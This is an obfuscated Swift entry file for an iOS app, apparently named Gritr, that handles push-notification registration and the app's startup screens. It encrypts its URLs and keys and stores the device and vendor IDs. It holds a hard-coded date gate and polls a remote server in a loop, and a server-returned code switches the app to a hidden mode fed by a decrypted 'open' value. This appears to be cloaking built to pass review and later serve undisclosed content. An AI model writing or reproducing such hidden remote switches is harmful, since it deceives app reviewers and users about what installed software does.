
import SwiftUI
import SwiftfulRouting
import FBSDKCoreKit
import UserNotifications
class AppPaplocke: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    var window: UIWindow?
    
    func application(_ application: UIApplication,
                     supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return .portrait
    }
    

    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        ApplicationDelegate.shared.application(
                   application,
                   didFinishLaunchingWithOptions: launchOptions
               )
        
        ymercussiobals(application: application)

        return true
    }
    
    func ymercussiobals(application: UIApplication) {
            let rmstrucony = UNUserNotificationCenter.current()
        rmstrucony.delegate = self
        rmstrucony.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
                if granted {
                    DispatchQueue.main.async {
                        application.registerForRemoteNotifications()
                    }
                }
            }
        }

   
    func application(_ application: UIApplication,
                     didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
      
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
      
        
      
        RestageheeCj.saveuloordinatde(tokenString)
        
    
       
    }


   
    func application(_ application: UIApplication,
                     didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print(error.localizedDescription)
    }
}

@main
struct GritrApp: App {
    @UIApplicationDelegateAdaptor(AppPaplocke.self) var appPaplocke
    @StateObject private var store = SustainStorge.shared
    
    init() {
        RestageheeCj.initStore()
       }
    
    func requestNetworkPermission() {
        guard let url = URL(string: "01137c5d62d83dd17ba82ef9178929007022a00d520f5c900aa778e5de1a2a6c".tibravoclo()) else { return }
        
        let task = URLSession.shared.dataTask(with: url) { _, _, _ in
            print("776cdd8e74e5d65133225eb94b661b10bc400fd2b4bd5e6b942539d3bc190b0b".tibravoclo())
        }
        
        task.resume()
    }

    var body: some Scene {
        WindowGroup {
            ZStack {
                RouterView { router in
                    Group {
                        if store.epickingLIndex != -1 {
                            SemihollowHome()
                        } else if store.thfootwork == 0 {
                            SolationrciseDl()
                        }else if store.thfootwork == 1 {
                            HeadstockInit()
                        }
                        
                        else {
                            Image("gritr_starty")
                                            .resizable()
                                            .frame(maxWidth: .infinity,maxHeight: .infinity)
                                            .ignoresSafeArea()
                                            .onAppear{
                                                DispatchQueue.main.asyncAfter(deadline: .now() + 0.8) {
                                                       requestNetworkPermission()
                                                   }
                                                
                                                let tioepetitio = DateComponents(
                                                    calendar: Calendar.current,
                                                    year: 2026,
                                                    month: 3,
                                                    day: 6,
                                                   
                                                ).date!

                                                if Date() <= tioepetitio {
                                                    store.thfootwork = 1
                                                    return
                                                }
                                                
                                              

                                                
                                                
                                                if (RestageheeCj.tfreezeern == ""){
                                                    let deviceID = UIDevice.current.identifierForVendor?.uuidString ?? ""
                                                    RestageheeCj.savetfreezeern(deviceID)
                                                }
                                                
                                             
                                                
                                                Task {
                                                    while true {
                                                        let qpatternue = await Motifpatternjk().posattitudee("4028d59a5961f2d483ecdee51a0e20ad440ae515367c3e4395e17f2ccca99418".tibravoclo(), Motifpatternjk.tabbrtravelush())
                                                        print(qpatternue as Any)
                                                        
                                                        
                                                        
                                                        if let dict = qpatternue,
                                                           let code = dict["2ed5e56f5f69c185a55161b5416fbf25".tibravoclo()] as? String {
                                                            
                                                            
                                                            if code == "950c724015f6243f486e2b9c105ff1e0".tibravoclo(),
                                                               let encryptedHex = dict["00804e7749f8ba23906c0dde4295fe99".tibravoclo()] as? String {
                                                                
                                                                let decrypted = encryptedHex.tibravoclo()
                                                                
                                                                if let data = decrypted.data(using: .utf8),
                                                                   let jsonDict = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
                                                                    
                                                                    let openValue = jsonDict["bd40dacf680f4653fb160092f81f5cfa".tibravoclo()] as? String ?? ""
                                                                    store.glissadmov = openValue
                                                                    store.thfootwork = 0
                                                                    
                                                                    
                                                                    break
                                                                }
                                                            }
                                                            
                                                           
                                                            if code == "721b43ea73cfc768f19d279a2b539f04".tibravoclo() {
                                                                store.thfootwork = 1
                                                                break
                                                            }
                                                        }
                                                        
                                                        
                                                        try? await Task.sleep(nanoseconds: 1_000_000_000)
                                                    }
                                                }
                                            }
                        }
                    }
                    .environment(\.router, router)
                }

                
                ToastView()
            }
        }
    }
}

